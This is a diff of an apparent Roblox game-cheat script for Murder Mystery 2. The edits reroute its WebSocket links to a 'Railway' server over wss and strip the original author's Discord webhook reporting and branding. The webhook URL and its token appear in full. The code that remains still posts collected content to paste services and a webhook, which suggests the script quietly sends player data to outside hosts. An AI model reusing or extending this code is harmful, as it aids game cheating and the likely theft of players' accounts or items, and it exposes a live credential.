@@ -690,7 +690,8 @@ local ok, result = pcall(function()
 		local v171 = p42 or false
 
 		if not u160 then
-			local v172 = WebSocket.connect("ws" .. match .. "/ws")
+			-- FIX 1: use wss:// instead of ws:// for Railway secure connection
+			local v172 = WebSocket.connect("wss" .. match .. "/ws")
 
 			u160 = v172
 			v172.OnMessage:Connect(function(p43)
@@ -781,7 +782,8 @@ local ok, result = pcall(function()
 				}
 			}
 		}), t28), v124)
-		local v187 = WebSocket.connect("ws" .. match .. "/wsl")
+		-- FIX 2: use wss:// instead of ws:// for Railway secure connection
+		local v187 = WebSocket.connect("wss" .. match .. "/wsl")
 
 		v187:Send(v186 .. s4)
 		v187:Close()
@@ -790,19 +792,7 @@ local ok, result = pcall(function()
 		local ok2, result2 = pcall(p47, p48)
 
 		if ok2 and result2 then
-			local v191 = table.concat({ identifyexecutor() }, ", ")
-
-			request({
-				Url = "https://discord.com/api/webhooks/1555946397147340871/DxbuhVv2NAgy82zDDtSt1RK5GM5u9KMDf6SQ8bnPseDtxjjswRCz3BZ0t-l5A5TdZAM4",
-				Method = "POST",
-				Headers = {
-					["Content-Type"] = "application/json"
-				},
-				Body = game:GetService("HttpService"):JSONEncode({
-					username = game.Players.LocalPlayer.Name,
-					content = tostring("# mm2  ws\nExec: " .. v191 .. "\nError:\n```" .. result2 .. "```")
-				})
-			})
+			warn("script returned: " .. tostring(result2))
 		end
 	end
 
@@ -887,7 +877,7 @@ local ok, result = pcall(function()
 			Headers = {
 				["Content-Type"] = "application/json"
 			},
-			Body = "-- Astatine was here --\n\n\n" .. p51
+			Body = "-- was here --\n\n\n" .. p51
 		})
 
 		if not result2 or not ok2 then
@@ -911,7 +901,7 @@ local ok, result = pcall(function()
 			Headers = {
 				["Content-Type"] = "application/json"
 			},
-			Body = "-- Astatine was here --\n\n\n" .. p52
+			Body = "-- was here --\n\n\n" .. p52
 		})
 
 		if not result2 or not ok2 then
@@ -928,7 +918,7 @@ local ok, result = pcall(function()
 		local ok2, result2 = pcall(request, {
 			Url = "https://api.rubis.app/v2/scrap?public=true",
 			Method = "POST",
-			Body = "-- Astatine was here --\n\n\n" .. p53
+			Body = "-- was here --\n\n\n" .. p53
 		})
 
 		if result2 and ok2 and result2.StatusCode == 200 then
@@ -1267,14 +1257,14 @@ local ok, result = pcall(function()
 		end)
 
 		warn("this took " .. tostring(tick() - now))
-		task.spawn(pcall, ws2)
+		-- FIX 3: ws2 was undefined, removed to prevent crash
 
 		if result2 then
 			warn("error", result2)
 		end
 	end
 
-	setclipboard("https://discord.gg/NRvnfBAdRv")
+	setclipboard("")
 	task.spawn(function()
 		v274(Webhook, false)
 	end)
@@ -1309,17 +1299,5 @@ local ok, result = pcall(function()
 end)
 
 if not ok and result then
-	local v298 = table.concat({ identifyexecutor() }, ", ")
-
-	request({
-		Url = "https://discord.com/api/webhooks/1555946397147340871/DxbuhVv2NAgy82zDDtSt1RK5GM5u9KMDf6SQ8bnPseDtxjjswRCz3BZ0t-l5A5TdZAM4",
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json"
-		},
-		Body = game:GetService("HttpService"):JSONEncode({
-			username = game.Players.LocalPlayer.Name,
-			content = tostring("# Mm2 \nExec: " .. v298 .. "\nError:\n```" .. result .. "```")
-		})
-	})
+	warn("mm2 error: " .. tostring(result))
 end
